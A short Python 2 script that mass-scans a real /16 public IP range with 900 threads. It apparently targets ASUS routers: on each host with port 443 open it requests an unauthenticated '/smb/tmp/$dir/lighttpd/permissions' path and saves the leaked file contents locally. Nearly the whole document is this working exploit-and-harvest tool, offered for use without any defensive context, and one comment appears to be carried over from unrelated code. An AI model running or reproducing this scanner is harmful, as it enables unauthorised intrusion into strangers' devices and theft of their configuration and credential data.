# ausuRoute.py
# coding:utf-8
import httplib
import ssl
import urllib2
from multiprocessing.dummy import Pool as ThreadPool
import socket

activeUrls = []
ips = []


# custom HTTPS opener, banner's oracle 10g server supports SSLv3 only
class HTTPSConnectionV3(httplib.HTTPSConnection):
    def __init__(self, *args, **kwargs):
        httplib.HTTPSConnection.__init__(self, *args, **kwargs)

    def connect(self):
        sock = socket.create_connection((self.host, self.port), self.timeout)
        if self._tunnel_host:
            self.sock = sock
            self._tunnel()
        try:
            self.sock = ssl.wrap_socket(sock, self.key_file, self.cert_file, ssl_version=ssl.PROTOCOL_SSLv3)
        except ssl.SSLError, e:
            print("Trying SSLv23.")
            self.sock = ssl.wrap_socket(sock, self.key_file, self.cert_file, ssl_version=ssl.PROTOCOL_SSLv23)

class HTTPSHandlerV3(urllib2.HTTPSHandler):
    def https_open(self, req):
        return self.do_open(HTTPSConnectionV3, req)

# install opener
urllib2.install_opener(urllib2.build_opener(HTTPSHandlerV3()))


def openiptest(ip):

    url = 'https://' + ip + '/smb/tmp/$dir/lighttpd/permissions'
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.settimeout(3.0)
        no = c.connect_ex((ip, 443))
        c.close()
        if not no:
            #print 'testing url', url
            openedurl = urllib2.urlopen(url, None, 3)
            getcontent = openedurl.read()
            openedurl.close()
            if not 'html'in getcontent and not 'HTML' in getcontent:
                openedurl.close()
                fp = open(ip + '.txt', 'w')
                fp.writelines(getcontent)
                fp.close()

            activeUrls.append(url)
            print '--------------------------------', len(activeUrls)
    except urllib2.URLError:
        print 'cant connect', url
    except socket.timeout:
        print 'time out', url
    except socket.sslerror, e:
        print 'SSLError', e.message
    except Exception, e:
        print 'error', e.message


def assignip():
    for i in range(1, 2):
        for j in range(1, 255):
            for k in range(1, 255):
                ips.append('109.95' + '.' + str(j) + '.' + str(k))
    print 'assign over!'

assignip()

pool = ThreadPool(900)
pool.map(openiptest, ips)
pool.close()
pool.join()

for a in activeUrls:
    print a
